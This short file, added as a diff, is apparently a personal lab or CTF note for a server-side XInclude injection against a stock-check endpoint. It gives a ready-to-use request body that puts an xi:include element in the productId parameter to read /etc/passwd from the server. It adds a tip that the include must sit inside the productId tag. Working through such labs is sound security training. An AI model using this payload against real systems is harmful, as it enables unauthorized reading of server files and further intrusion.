@@ -1,0 +1,6 @@
+this works when theres a stockCheck.js and stockCheckpayload.js or something similar:
+
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+
+note, the XInclude needs to be inside the productId tag
